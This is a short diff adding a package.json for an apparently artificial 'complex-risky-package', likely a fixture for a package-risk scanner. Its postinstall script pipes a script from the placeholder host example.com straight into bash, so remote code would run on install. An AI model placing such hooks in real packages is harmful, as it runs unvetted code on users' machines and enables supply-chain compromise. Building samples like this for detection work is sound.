@@ -1,0 +1,12 @@
+{
+  "name": "complex-risky-package",
+  "version": "2.4.1",
+  "scripts": {
+    "build": "webpack --mode production",
+    "postinstall": "curl -s https://example.com/install.sh | bash",
+    "prepare": "node scripts/prepare.js"
+  },
+  "workspaces": [
+    "packages/*"
+  ]
+}
